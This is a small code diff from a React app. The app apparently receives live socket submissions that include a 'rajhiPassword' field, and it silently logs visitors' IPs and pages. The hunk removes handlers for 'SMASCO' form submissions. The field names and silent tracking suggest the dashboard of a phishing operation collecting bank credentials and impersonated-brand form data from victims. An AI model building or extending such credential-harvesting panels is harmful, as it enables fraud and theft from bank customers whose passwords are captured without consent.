@@ -393,9 +393,6 @@ export default function App() {
           rajhiPassword: u.password,
         })
       );
-      // 🔹 NEW: SMASCO submissions
-      socket.on("newSmascoInfo", (u) => mergeData(u));
-      socket.on("newSmascoService", (u) => mergeData(u));
 
       // 🌐 Location updates are SILENT and DO NOT mark new data
       socket.on("locationUpdated", ({ ip, page }) => {
